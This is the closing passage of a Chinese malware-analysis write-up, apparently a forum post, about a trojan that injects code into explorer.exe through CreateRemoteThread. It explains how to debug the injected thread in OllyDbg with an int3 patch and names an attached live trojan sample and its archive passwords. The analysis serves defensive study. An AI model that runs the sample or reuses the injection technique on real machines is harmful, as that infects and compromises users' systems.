+.data:004048D5 83 F8 00                                cmp     eax, 0  
+  
+你可以用，winhex 来查看被注入到 exploere 中的机器字节码，地址是 CreateRemoteThread 中的一个参数  
+  
+至此，本木马的注入过程已经完成，如果要继续调试其注入的进程，你可以在上面的第一个注入代码 函数 WriteCodeintoExplorer 执行之前，将  
+00403057 处的第一个字节修改成 CC，并在 CreateRemoteThread 执行之前，将 OD 设置成 即时调试器，然后当 远程线程被调用时，cc int3 中断将导致 OD 被呼出，呼出后，将 OD 中断处的 int3 （一些溢出利用，也可以用这一方法）修改为 push ebp，便可以在 explorere 中调试注入的代码了。后续分析就不继续了，由你自己完成。  
+  
+注明，此为木马，用 OD 调试时，请在虚拟环境下分析。  
+附件中一个是木马文件(freecell.zip)另外一个是我分析的 IDB 文件（dump.idb）  
+附件默认密码是：infected  
+特别申明：附件里面的 exe-1 文件为木马，如想调试分析，请在虚拟环境中调试，切不可在本机执行。解压密码：：muma123 
+
+上传的附件
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || freecell.rar  
+ |
